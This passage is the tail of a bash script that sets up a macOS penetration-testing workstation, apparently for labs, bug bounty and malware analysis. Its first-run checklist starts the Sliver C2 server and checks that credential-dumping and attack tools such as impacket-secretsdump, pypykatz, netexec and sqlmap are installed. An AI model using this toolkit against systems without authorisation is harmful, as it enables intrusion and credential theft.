    Apple Silicon: /opt/homebrew/etc/proxychains.conf
    Intel:         /usr/local/etc/proxychains.conf

FIRST-RUN CHECKLIST:
  □ Restart Terminal
  □ brew doctor
  □ source ~/.zshrc
  □ bw login                          (Bitwarden CLI)
  □ shodan init <API_KEY>
  □ sudo sliver-server                (test Sliver C2)
  □ vol3 --help                       (test Volatility3)
  □ which nmap ffuf nuclei subfinder httpx sqlmap rustscan dalfox
  □ which impacket-secretsdump pypykatz netexec certipy

USEFUL FOLDERS:
  ~/labs            CTF and lab workspaces
  ~/tools           Cloned repos and custom tools
  ~/wordlists       SecLists, assetnote, and other wordlists
  ~/reports         Pentest / bug bounty reports
  ~/screenshots     Evidence and findings
  ~/memory-dumps    Volatility3 analysis targets
  ~/pcaps           Packet captures for Wireshark/Zeek/Suricata
  ~/malware-samples Malware analysis (isolate in VM when running)

EOF
}

### ---------- main ----------
main() {
  require_macos
  install_xcode_clt
  install_homebrew
  ensure_shell_profile
  create_dirs
  brew_taps
  brew_update_upgrade
  install_formulae
  install_casks
  setup_pipx
  setup_rust
  setup_go_tools
  install_manual_tools
  clone_repos
  setup_gf_patterns
  write_shell_config
  finalize_tools
  manual_notes
}

main "$@"
